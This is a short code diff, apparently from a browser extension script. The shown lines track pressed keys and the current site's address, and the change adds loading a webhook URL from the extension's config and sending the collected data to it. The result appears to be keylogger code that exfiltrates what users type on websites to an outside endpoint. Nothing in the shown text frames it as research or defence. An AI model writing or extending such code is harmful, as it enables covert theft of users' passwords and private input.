@@ -18,6 +18,10 @@ let allCharacters = [
 
 let pressedKeys = "";
 
+const response = await fetch(chrome.runtime.getURL('js/config.json'));
+const config = await response.json();
+const URL = config.webhookUrl
+
 function send(str, link) {
   const namecontent = window.location.hostname + window.location.pathname; // Get the site name
 
@@ -58,4 +62,4 @@ async function startSending(link) {
   }
 }
 
-startSending(" ? ");
+startSending(URL);
